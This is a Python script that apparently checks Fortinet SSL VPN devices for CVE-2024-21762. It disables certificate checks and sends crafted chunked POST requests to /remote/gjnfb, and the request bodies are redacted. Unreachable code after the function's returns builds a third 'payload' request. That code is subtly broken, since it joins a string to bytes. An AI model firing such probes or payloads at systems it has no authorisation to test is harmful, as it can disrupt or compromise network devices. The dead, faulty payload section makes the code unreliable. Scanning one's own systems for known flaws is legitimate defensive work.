import socket
import ssl
import sys
from colorama import Fore, Style

context = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
context.check_hostname = False
context.verify_mode = ssl.CERT_NONE

TIMEOUT = 10

def send_req(host, req):
    try:
        s = socket.create_connection(host, timeout=5)
    except:
        return -1
    ss = context.wrap_socket(s)
    ss.send(req)
    try:
        return ss.read(2048)
    except socket.timeout:
        return 0

control_req = """POST /remote/gjnfb HTTP/1.1\r
Host: {}\r
Transfer-Encoding: chunked\r
\r
0\r
\r
\r
"""

check_req = """POST /remote/gjnfb HTTP/1.1\r
Host: {}\r
Transfer-Encoding: chunked\r
\r
[REDACTED]
\r
"""

payload_req = """POST /remote/gjnfb HTTP/1.1\r
Host: {}\r
Transfer-Encoding: chunked\r
Content-Type: application/x-www-form-urlencoded\r
\r
[REDACTED]
\r
"""

def check(host):
    baseurl = "https://{}:{}".format(*host)
    r1 = send_req(host, control_req.format(baseurl).encode())
    if r1 == -1:
        return f"{Fore.RED}Connection Failed{Style.RESET_ALL}"
    if r1 == 0:
        return f"{Fore.YELLOW}Control request failed{Style.RESET_ALL}"
    if b"HTTP/1.1 403 Forbidden" not in r1:
        print(f"{Fore.YELLOW}[warning] Server does not look like a Fortinet SSL VPN interface{Style.RESET_ALL}")
    r2 = send_req(host, check_req.format(baseurl).encode())
    if r2 == 0:
        return f"{Fore.RED}Vulnerable{Style.RESET_ALL}"
    else:
        return f"{Fore.GREEN}Patched{Style.RESET_ALL}"

    # Третий запрос с пэйлоадом
    payload = "[REDACTED]"
    payload_encoded = payload.encode('utf-8')
    payload_chunked = hex(len(payload_encoded))[2:].zfill(16) + payload_encoded

    r3 = send_req(host, payload_req.format(baseurl).encode() + payload_chunked)
    if r3 == 0:
        return f"{Fore.RED}Vulnerable (with payload){Style.RESET_ALL}"
    else:
        return f"{Fore.GREEN}Patched{Style.RESET_ALL}"

if __name__ == "__main__":
    try:
        host = sys.argv[1]
        port = int(sys.argv[2])
    except:
        print(f"{Fore.RED}Usage: check-cve-2024-21762.py <host> <port>{Style.RESET_ALL}")
        exit()

    HOST = (host, port)
    print(check(HOST))
